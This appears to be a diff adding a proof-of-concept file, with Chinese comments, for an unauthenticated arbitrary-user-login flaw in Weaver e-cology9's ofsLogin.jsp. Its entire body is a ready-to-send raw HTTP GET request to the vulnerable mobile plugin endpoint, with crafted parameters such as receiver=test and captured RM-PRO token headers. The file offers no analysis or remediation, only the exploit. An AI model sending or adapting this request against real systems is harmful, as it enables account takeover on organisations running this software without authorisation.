@@ -1,0 +1,10 @@
+# 泛微e-cology ofsLogin.jsp任意用户登录漏洞
+# 泛微 e-cology9 存在前台任意用户登录漏洞。该漏洞允许未经身份验证的攻击者通过发送构造的请求触发漏洞，成功利用此漏洞的攻击者可登录任意用户。
+GET /mobile/plugin/1/ofsLogin.jsp?syscode=syscode&timestamp=&gopage=&receiver=test&loginTokenFromThird=&acid=80001473&bid=hd_tag_m8mv25zy HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25zy
+RM-PRO-Token: db71c0f084636309c1f41401fc6044a0
+RM-PRO-Time: 1742808517743
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
